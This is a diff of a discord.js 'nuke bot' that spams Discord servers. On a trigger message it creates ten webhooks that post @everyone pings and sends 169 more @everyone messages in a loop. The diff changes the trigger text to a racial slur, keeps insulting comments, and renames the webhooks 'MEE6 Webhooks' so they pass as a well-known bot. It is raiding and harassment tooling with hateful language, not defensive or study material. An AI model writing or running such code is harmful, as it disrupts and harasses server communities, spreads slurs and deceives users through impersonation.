@@ -2,7 +2,7 @@ const Discord = require('discord.js');
 const { token, prefix } = require('./config.json');
 const client = new Discord.Client();
 
-//nuke bot by 【ＣＧ】assy
+//nuke bot by  Delta Airlines ass
 //its not the best clearly but pretty good
 //have fun retards
 //oh also im not responsible for ur nukes
@@ -18,14 +18,14 @@ client.on('message', message => {
         })
     }
 })
-//webhook spam
+//webhook spammy spam spam, spam spam
 //creates 10 of them and each spam 3 messages(which is enough in fact)
 client.on('message', message => {
-    if(message.content === `@everyone fucked`) {
+    if(message.content === `@everyone hi niggers`) {
         var number = 1;
     while (number <= 10) {
-        message.channel.createWebhook('ass')
-        .then(webhook => webhook.send("@everyone get rekt")//what it sends
+        message.channel.createWebhook('MEE6 Webhooks')
+        .then(webhook => webhook.send("@everyone hi")//what it sends
         .then(webhook.send("@everyone get rekt"))
         .then(webhook.send("@everyone get rekt")))
     number++;
@@ -34,7 +34,7 @@ client.on('message', message => {
 })
 //normal bot spam
 client.on('message', message => {
-    if(message.content === "@everyone fucked") {
+    if(message.content === "@everyone hi") {
         var number = 1;
         while (number <=169) {
             message.channel.send("@everyone cg owns u")//what it sends
